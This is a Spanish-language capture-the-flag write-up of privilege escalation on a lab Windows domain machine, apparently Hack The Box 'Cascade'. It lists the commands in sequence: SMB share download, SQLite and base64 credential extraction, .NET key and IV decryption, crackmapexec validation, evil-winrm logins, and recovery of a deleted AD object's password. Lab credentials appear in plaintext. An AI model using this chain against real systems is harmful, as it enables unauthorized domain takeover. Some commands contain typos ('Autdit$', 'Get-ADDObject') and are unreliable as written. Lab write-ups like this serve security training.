## Privilege Escalation {-}

### Rootear la maquina {-}

```powershell
cd C:\Users\Administrator
dir
whoami /priv
whoami /all
net user
net localgroup "Audit Share"
```

Aqui vemos quel usuario es parte de un grupo `Audit Share` y que le da el privilegio de ver un recurso compartido a nivel de red llamado `\\Casc-DC1\Audit$`.

```bash
smbmap -H 10.10.10.182 's.smith' -p 'sT33ve2'
mkdir Audit
cd Audit
smbclient //10.10.10.182/Autdit$ -U "s.smith%sT33ve2"
dir
prompt off
recurse ON
mget *
```

Aqui hemos descargado todo los ficheros del recurso compartido. Hay un fichero `Audit.db`, lo analyzamos con sqlite

```bash
cd DB
sqlite3 Audit.db

.tables
select * from DeletedUserAudit;
select * from Ldap;
```

Vemos una contraseña encryptada en base64 del usuario `ArkSvc`.

```bash
echo "8QO5l5Kj9MdErXx6Q6AG0w==" | base64 -d; echo
echo "8QO5l5Kj9MdErXx6Q6AG0w==" | base64 -d > arksvc_password
cat arksvc_password
```

Nuevamente vemos que es una contraseña encryptada. Tenemos que buscar con que a sido encryptada.

Como hay differentes ficheros windows, transferimos los ficheros a una maquina windows.

En la maquina windows, instalamos el `dotPeek` que es una heramienta que nos permite analyzar codigo dotNet a bajo nivel.
Vemos aqui una Key y utiliza la dll CascCrypto para encryptar y desencryptar cosas. Analyzamos la dll y vemos que utiliza un **Modo CBC** para 
encryptar y desencryptar. Vemos un **IV** y con [cyberChef](https://gchq.github.io/CyberChef/) desencryptamos la contraseña.

```{r, echo = FALSE, fig.cap="CBC decrypt with cyberchef", out.width="90%"}
    knitr::include_graphics("images/Cascade-cbc-decrypt.png")
```

Ya tenemos contraseña y validamos con crackmapexec.

```bash
crackmapexec smb 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
crackmapexec winrm 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
```

Como el usuario esta **Pwn3d!** con winrm nos connectamos con **Evil-WinRM**.

```bash
evil-winrm -i 10.10.10.182 -u 'arksvc' -p 'w3lc0meFr31nd'
```

Enumeramos

```powershell
cd C:\Users\Administrator
dir
whoami /priv
```

Aqui vemos que el usuario es parte del grupo **AD Recycle Bin** y esto nos hace pensar que los ficheros que hemos visto
contiene un log en el cual habia el usuario **AdminTemp** en el **Recycle Bin**. Esto podria permitirnos buscar Objetos
borrados. Buscando por internet encontramos un comando:

```powershell
Get-ADDObject -Filter 'Deleted -eq $true' -IncludeDeletedObjects
```

Encontramos el usuario borrado pero necesitamos ver si podemos encontrar propriedades de este objeto

```powershell
Get-ADDObject -Filter 'Deleted -eq $true' -IncludeDeletedObjects -Properties *
```

Aqui encontramos su **CascadeLegacyPwd** en base64

```bash
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d; echo
```

Parece ser una contraseña. Como en el email que hemos encontrado, se supone que la contraseña es la misma que la contraseña del usuario **Administrator**.
Lo comprobamos

```bash
crackmapexec smb 10.10.10.182 -u 'Administrator' -p 'baCT3r1aN00dles'
```

y si vemos el **Pwn3d!**. Esto quiere decir que nos podemos conectar con **Evil WinRM**.

```bash
evil-winrm -i 10.10.10.182 -u 'Administrator' -p 'baCT3r1aN00dles'

whoami
#Output 
cascade\administrator
```

Ya podemos leer la flag.

